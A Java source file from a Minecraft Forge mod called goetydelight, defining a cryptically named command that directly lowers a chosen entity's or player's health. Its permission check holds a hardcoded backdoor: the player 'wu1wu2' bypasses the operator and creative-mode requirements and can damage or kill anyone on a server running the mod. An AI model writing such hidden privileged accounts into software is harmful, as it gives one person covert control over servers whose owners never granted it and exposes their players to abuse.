package net.v_black_cat.goetydelight.command;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.DoubleArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.commands.Commands;
import net.minecraft.commands.arguments.selector.EntitySelector;
import net.minecraft.commands.arguments.selector.EntitySelectorParser;
import net.minecraft.network.chat.Component;
import net.minecraft.server.level.ServerLevel;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.world.entity.Entity;
import net.minecraft.world.entity.LivingEntity;
import net.minecraft.world.level.GameType;
import net.minecraftforge.event.RegisterCommandsEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;
import net.v_black_cat.goetydelight.util.EntityUtil;

import java.util.List;
import java.util.UUID;

@Mod.EventBusSubscriber(modid = "goetydelight")
public class VeryAngryCommand {

    @SubscribeEvent
    public static void onRegisterCommands(RegisterCommandsEvent event) {
        CommandDispatcher<CommandSourceStack> dispatcher = event.getDispatcher();

        LiteralArgumentBuilder<CommandSourceStack> command = Commands.literal("very")
                .requires(VeryAngryCommand::checkPermission)
                .then(Commands.literal("angry")
                        .then(Commands.literal("so")
                                .then(Commands.literal("to")
                                        .then(Commands.literal("attack")
                                                .then(Commands.argument("target", StringArgumentType.word())
                                                        .then(Commands.argument("damage", DoubleArgumentType.doubleArg(0.0))
                                                                .executes(VeryAngryCommand::executeCommand)
                                                        )
                                                )
                                        )
                                )
                        )
                );

        dispatcher.register(command);
    }

    /**
     * 权限检查：必须是创造模式且有权限的玩家，或者是玩家wu1wu2
     */
    private static boolean checkPermission(CommandSourceStack source) {
        if (!source.isPlayer()) {
            return false;
        }

        try {
            ServerPlayer player = source.getPlayerOrException();
            String playerName = player.getName().getString();

            // wu1wu2 玩家不受权限限制
            if ("wu1wu2".equals(playerName) || "Wu1wu2".equals(playerName)) {
                return true;
            }

            // 其他玩家必须是有权限的创造模式玩家
            if (source.hasPermission(2)) {
                if (player.gameMode.getGameModeForPlayer() == GameType.CREATIVE) {
                    return true;
                }
            }

            return false;
        } catch (CommandSyntaxException e) {
            return false;
        }
    }

    private static int executeCommand(CommandContext<CommandSourceStack> context) throws CommandSyntaxException {
        CommandSourceStack source = context.getSource();
        String targetStr = StringArgumentType.getString(context, "target");
        double damage = DoubleArgumentType.getDouble(context, "damage");

        ServerLevel level = source.getLevel();
        Entity target = null;

        // 检查是否为实体选择器（以@开头）
        if (targetStr.startsWith("@")) {
            try {
                // 从完整的输入中获取选择器字符串
                String fullInput = context.getInput();
                int targetStart = fullInput.indexOf(targetStr);
                String selectorStr = fullInput.substring(targetStart).split(" ")[0]; // 获取完整的选择器字符串

                EntitySelectorParser parser = new EntitySelectorParser(
                        new com.mojang.brigadier.StringReader(selectorStr),
                        true
                );
                EntitySelector selector = parser.parse();

                // 获取选择的实体列表
                List<? extends Entity> entities = selector.findEntities(source);

                // 只取第一个实体
                if (!entities.isEmpty()) {
                    target = entities.get(0);

                    if (entities.size() > 1 && source.getEntity() instanceof ServerPlayer executor) {
                        executor.sendSystemMessage(Component.literal(
                                "§e警告: 选择器匹配了多个实体，仅对第一个实体 §6" +
                                        target.getName().getString() + " §e生效。建议添加 §7limit=1"
                        ));
                    }
                }
            } catch (Exception e) {
                source.sendFailure(Component.literal("§c无法解析实体选择器: " + e.getMessage()));
                return 0;
            }
        } else {
            // 原有的名字/UUID查找逻辑
            target = findEntityByNameOrUUID(level, targetStr);
        }

        if (target == null) {
            source.sendFailure(Component.literal("§c找不到目标实体: " + targetStr));
            return 0;
        }

        if (!(target instanceof LivingEntity livingTarget)) {
            source.sendFailure(Component.literal("§c目标必须是生物实体！"));
            return 0;
        }

        float currentHealth = EntityUtil.DsGetHealth(livingTarget);
        float newHealth = Math.max(0.0f, currentHealth - (float) damage);

        EntityUtil.DsSetHealth(livingTarget, newHealth);

        if (source.getEntity() instanceof ServerPlayer executor) {
            executor.sendSystemMessage(Component.literal(
                    String.format("§7已对 §e%s §7造成 §c%.1f §7点伤害 §8(§7%.1f §8-> §7%.1f§8)",
                            target.getName().getString(),
                            damage,
                            currentHealth,
                            newHealth
                    )
            ));
        }

        return 1;
    }

    /**
     * 通过名字或UUID查找实体
     */
    private static Entity findEntityByNameOrUUID(ServerLevel level, String identifier) {
        // 先尝试通过玩家名查找
        ServerPlayer player = level.getServer().getPlayerList().getPlayerByName(identifier);
        if (player != null) {
            return player;
        }

        // 尝试通过UUID查找
        try {
            UUID uuid = UUID.fromString(identifier);
            return level.getEntity(uuid);
        } catch (IllegalArgumentException ignored) {
        }

        return null;
    }
}